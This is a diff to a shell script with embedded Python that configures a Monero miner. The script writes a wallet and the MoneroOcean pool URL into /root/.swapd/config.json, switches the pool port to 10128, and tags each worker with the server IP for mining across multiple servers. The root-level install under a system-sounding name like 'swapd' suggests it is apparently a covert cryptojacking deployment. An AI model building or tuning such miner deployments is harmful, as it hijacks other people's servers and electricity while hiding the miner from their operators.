@@ -1766,8 +1766,8 @@ try:
         # Set wallet in first pool
         config['pools'][0]['user'] = '$WALLET'
         
-        # Set pool URL (PORT 18192 - CPU/GPU FARM - for multiple servers)
-        config['pools'][0]['url'] = 'gulf.moneroocean.stream:18192'
+        # Set pool URL (PORT 10128 - Modern CPU/GPU)
+        config['pools'][0]['url'] = 'gulf.moneroocean.stream:10128'
         
         # CRITICAL: Set pass to server IP (for worker identification)
         config['pools'][0]['pass'] = server_ip
@@ -1783,8 +1783,8 @@ try:
         # Set wallet
         config['user'] = '$WALLET'
         
-        # Set pool URL (PORT 18192 - CPU/GPU FARM - for multiple servers)
-        config['url'] = 'gulf.moneroocean.stream:18192'
+        # Set pool URL (PORT 10128 - Modern CPU/GPU)
+        config['url'] = 'gulf.moneroocean.stream:10128'
         
         # CRITICAL: Set pass to server IP
         config['pass'] = server_ip
@@ -1839,8 +1839,8 @@ PYEOF
     fi
     
     # Verify pool was set
-    if grep -q 'gulf.moneroocean.stream:10004' /root/.swapd/config.json 2>/dev/null; then
-        echo "[✓] Pool correctly set: gulf.moneroocean.stream:10004"
+    if grep -q 'gulf.moneroocean.stream:10128' /root/.swapd/config.json 2>/dev/null; then
+        echo "[✓] Pool correctly set: gulf.moneroocean.stream:10128"
     else
         echo "[!] ERROR: Pool NOT correctly set!"
     fi
